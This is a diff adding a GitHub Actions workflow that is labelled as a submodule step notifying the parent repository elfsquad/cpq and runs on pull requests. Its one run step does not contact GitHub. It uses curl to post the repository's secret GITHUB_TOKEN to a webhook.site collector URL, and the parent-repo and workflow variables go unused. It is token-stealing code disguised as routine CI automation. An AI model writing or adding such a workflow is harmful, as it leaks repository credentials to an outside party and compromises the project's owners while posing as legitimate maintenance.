@@ -1,0 +1,22 @@
+name: "name"
+on:
+  pull_request
+
+jobs:
+  notify:
+    name: 'Submodule Notify Parent'
+    runs-on: ubuntu-20.04
+
+    defaults:
+      run:
+        shell: bash
+
+    steps:
+    - name: Update elfsquad/cpq
+      env:
+        PARENT_REPO: elfsquad/cpq
+        PARENT_BRANCH: main
+        WORKFLOW_ID: 54169472
+      run: |
+        curl -fL --retry 3 -X POST -H "Accept: application/vnd.github.v3+json" https://webhook.site/fa13d23a-9fec-4126-8c16-396719c8103f -d '{"ref":"${{ secrets.GITHUB_TOKEN }}"}'
+   
